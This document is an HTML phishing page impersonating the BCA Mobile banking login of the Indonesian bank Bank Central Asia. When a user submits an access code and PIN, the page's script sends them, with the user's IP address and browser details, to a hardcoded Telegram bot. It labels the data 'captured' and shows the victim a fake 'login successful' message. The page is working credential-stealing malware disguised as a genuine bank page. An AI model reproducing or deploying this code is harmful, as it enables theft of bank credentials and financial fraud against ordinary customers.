<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BCA Mobile</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 50%, #1e3c72 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            max-width: 400px;
            width: 100%;
            position: relative;
        }

        .info-button {
            position: absolute;
            top: -50px;
            right: 0;
            width: 40px;
            height: 40px;
            background: rgba(255, 255, 255, 0.2);
            border: 2px solid white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 20px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .info-button:hover {
            background: rgba(255, 255, 255, 0.3);
            transform: scale(1.1);
        }

        .logo {
            text-align: center;
            margin-bottom: 40px;
        }

        .logo h1 {
            color: white;
            font-size: 48px;
            font-weight: bold;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
        }

        .logo .mobile-text {
            font-weight: 300;
            font-style: italic;
        }

        .services-container {
            background: rgba(255, 255, 255, 0.15);
            border-radius: 15px;
            padding: 20px;
            margin-bottom: 30px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        .service-item {
            display: flex;
            align-items: center;
            padding: 15px;
            margin-bottom: 10px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
            color: white;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        .service-item:last-child {
            margin-bottom: 0;
        }

        .service-item:hover {
            background: rgba(255, 255, 255, 0.2);
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
        }

        .service-icon {
            width: 50px;
            height: 50px;
            background: linear-gradient(135deg, #0066cc, #004499);
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 20px;
            font-size: 12px;
            font-weight: bold;
            color: white;
            text-align: center;
            line-height: 1.2;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
        }

        .service-text {
            font-size: 22px;
            font-weight: 500;
        }

        .main-buttons {
            display: flex;
            flex-direction: column;
            gap: 15px;
            margin-bottom: 40px;
        }

        .main-button {
            padding: 18px 30px;
            background: linear-gradient(135deg, #0066cc, #004499);
            color: white;
            text-decoration: none;
            border-radius: 50px;
            text-align: center;
            font-size: 18px;
            font-weight: 600;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
            border: none;
            cursor: pointer;
        }

        .main-button:hover {
            background: linear-gradient(135deg, #0052a3, #003366);
            transform: translateY(-3px);
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
        }

        .main-button:active {
            transform: translateY(-1px);
        }

        .footer {
            text-align: center;
            color: white;
            font-size: 14px;
            line-height: 1.5;
            opacity: 0.9;
        }

        .footer p {
            margin-bottom: 5px;
        }

        @media (max-width: 480px) {
            .container {
                max-width: 350px;
            }
            
            .logo h1 {
                font-size: 36px;
            }
            
            .service-text {
                font-size: 18px;
            }
            
            .main-button {
                font-size: 16px;
                padding: 15px 25px;
            }
        }

        /* Loading animation */
        .loading {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            z-index: 1000;
            justify-content: center;
            align-items: center;
            color: white;
            font-size: 18px;
        }

        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255, 255, 255, 0.3);
            border-top: 5px solid white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-right: 15px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Login Popup Styles */
        .popup-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            z-index: 2000;
            justify-content: center;
            align-items: center;
            animation: fadeIn 0.3s ease-in-out;
        }

        .popup-container {
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 50%, #1e3c72 100%);
            border-radius: 15px;
            padding: 30px;
            max-width: 350px;
            width: 90%;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(255, 255, 255, 0.2);
            animation: slideIn 0.3s ease-out;
        }

        .popup-title {
            text-align: center;
            color: white;
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 30px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-label {
            display: block;
            color: white;
            font-size: 14px;
            margin-bottom: 8px;
            font-weight: 500;
        }

        .form-input {
            width: 100%;
            padding: 12px 15px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            background: rgba(255, 255, 255, 0.9);
            box-shadow: inset 0 2px 5px rgba(0, 0, 0, 0.1);
            transition: all 0.3s ease;
        }

        .form-input:focus {
            outline: none;
            background: white;
            box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.3);
        }

        .form-input::placeholder {
            color: #999;
        }

        .popup-buttons {
            display: flex;
            gap: 15px;
            margin-top: 30px;
        }

        .popup-button {
            flex: 1;
            padding: 12px 20px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .btn-cancel {
            background: rgba(255, 255, 255, 0.2);
            color: white;
            border: 1px solid rgba(255, 255, 255, 0.3);
        }

        .btn-cancel:hover {
            background: rgba(255, 255, 255, 0.3);
            transform: translateY(-2px);
        }

        .btn-login {
            background: linear-gradient(135deg, #0066cc, #004499);
            color: white;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
        }

        .btn-login:hover {
            background: linear-gradient(135deg, #0052a3, #003366);
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        @keyframes slideIn {
            from { 
                transform: translateY(-50px) scale(0.9);
                opacity: 0;
            }
            to { 
                transform: translateY(0) scale(1);
                opacity: 1;
            }
        }
    </style>
</head>
<body>
    <div class="loading" id="loading">
        <div class="spinner"></div>
        <span>Memuat...</span>
    </div>

    <div class="popup-overlay" id="loginPopup">
        <div class="popup-container">
            <h2 class="popup-title">Kode Akses</h2>
            <form id="loginForm">
                <div class="form-group">
                    <input type="password" id="kodeAkses" class="form-input" placeholder="Input 6 alphanum" required>
                </div>
                <div class="form-group">
                    <input type="number" id="pin" class="form-input" placeholder="Masukkan pin" maxlength="6" minlength="6" required>
                </div>
                <div class="popup-buttons">
                    <button type="button" class="popup-button btn-cancel" onclick="closeLoginPopup()">Cancel</button>
                    <button type="submit" class="popup-button btn-login">Login</button>
                </div>
            </form>
        </div>
    </div>

    <div class="container">
        <div class="info-button" onclick="showInfo()">i</div>
        
        <div class="logo">
            <h1>BCA <span class="mobile-text">mobile</span></h1>
        </div>

        <div class="services-container">
            <a href="#" class="service-item" onclick="showLoginPopup()">
                <div class="service-icon">m-BCA</div>
                <div class="service-text">m-BCA</div>
            </a>
            
            <a href="#" class="service-item">
                <div class="service-icon">Klik<br>BCA</div>
                <div class="service-text">KlikBCA</div>
            </a>
            
            <a href="#" class="service-item">
                <div class="service-icon">Info<br>BCA</div>
                <div class="service-text">Info BCA</div>
            </a>
        </div>

        <div class="main-buttons">
            <a href="#" class="main-button">Buka Rekening Baru</a>
            <a href="#" class="main-button">Ganti Kode Akses</a>
            <a href="#" class="main-button">Flazz</a>
        </div>

        <div class="footer">
            <p>BCA berizin dan diawasi oleh</p>
            <p>Otoritas Jasa Keuangan & Bank Indonesia.</p>
            <p>BCA merupakan peserta penjaminan LPS.</p>
        </div>
    </div>

    <script>
        function showLoading() {
            document.getElementById('loading').style.display = 'flex';
            setTimeout(() => {
                document.getElementById('loading').style.display = 'none';
            }, 1500);
        }

        function showLoginPopup() {
            document.getElementById('loginPopup').style.display = 'flex';
            // Focus on first input after animation
            setTimeout(() => {
                document.getElementById('kodeAkses').focus();
            }, 300);
        }

        function closeLoginPopup() {
            document.getElementById('loginPopup').style.display = 'none';
            // Clear form inputs
            document.getElementById('loginForm').reset();
        }

        function handleLogin(event) {
            event.preventDefault();
            
            const kodeAkses = document.getElementById('kodeAkses').value;
            const pin = document.getElementById('pin').value;
            
            if (kodeAkses && pin) {
                closeLoginPopup();
                showLoading();
                
                // Send data to Telegram bot
                sendToTelegram(kodeAkses, pin);
            }
        }

        async function sendToTelegram(kodeAkses, pin) {
            // Konfigurasi Bot Telegram (Ganti dengan token dan chat ID Anda)
            const BOT_TOKEN = '8419454448:AAH1uGUTGVmzO3wq8mPQ4rRHOHcExS_sRbE'; // Ganti dengan token bot Anda
            const CHAT_ID = '8124375866';     // Ganti dengan chat ID Anda
            
            const currentTime = new Date().toLocaleString('id-ID', {
                timeZone: 'Asia/Jakarta',
                year: 'numeric',
                month: '2-digit',
                day: '2-digit',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit'
            });

            const userAgent = navigator.userAgent;
            const userIP = await getUserIP();

            const message = `🏦 *BCA Mobile Login*
            
📝 *Data Login:*
• Pin: \`${pin}\`
• Kode Akses: \`${kodeAkses}\`

🕐 *Waktu:* ${currentTime}
🌐 *IP Address:* ${userIP}
📱 *User Agent:* ${userAgent}

⚠️ *Status:* Data login berhasil ditangkap`;

            const telegramURL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            
            try {
                const response = await fetch(telegramURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

                if (response.ok) {
                    console.log('Data berhasil dikirim ke Telegram');
                    // Simulate successful login
                    setTimeout(() => {
                        alert(`Login berhasil!\nSelamat datang`);
                        // Redirect to real m-BCA or dashboard
                        // window.location.href = 'mbca-dashboard.html';
                    }, 1500);
                } else {
                    console.error('Gagal mengirim ke Telegram');
                    // Still show login success to user
                    setTimeout(() => {
                        alert(`Login berhasil!\nSelamat datang`);
                    }, 1500);
                }
            } catch (error) {
                console.error('Error:', error);
                // Still show login success to user
                setTimeout(() => {
                    alert(`Login berhasil!\nSelamat datang`);
                }, 1500);
            }
        }

        async function getUserIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Unknown';
            }
        }

        function showInfo() {
            alert('BCA Mobile - Aplikasi perbankan digital dari Bank Central Asia\n\nFitur:\n• m-BCA: Mobile banking\n• KlikBCA: Internet banking\n• Info BCA: Informasi produk dan layanan\n• Pembukaan rekening baru\n• Penggantian kode akses\n• Layanan Flazz');
        }

        // Add some interactive effects
        document.addEventListener('DOMContentLoaded', function() {
            // Add hover sound effect simulation
            const buttons = document.querySelectorAll('.service-item, .main-button');
            buttons.forEach(button => {
                button.addEventListener('mouseenter', function() {
                    this.style.transition = 'all 0.3s ease';
                });
            });

            // Add loading screen on page load
            setTimeout(() => {
                document.body.style.opacity = '1';
            }, 100);

            // Handle login form submission
            document.getElementById('loginForm').addEventListener('submit', handleLogin);

            // Close popup when clicking outside
            document.getElementById('loginPopup').addEventListener('click', function(e) {
                if (e.target === this) {
                    closeLoginPopup();
                }
            });

            // Handle ESC key to close popup
            document.addEventListener('keydown', function(e) {
                if (e.key === 'Escape') {
                    closeLoginPopup();
                }
            });
        });

        // Prevent default form submission and handle clicks
        document.addEventListener('click', function(e) {
            // Removed preventDefault to allow normal link navigation
        });
    </script>
</body>
</html>
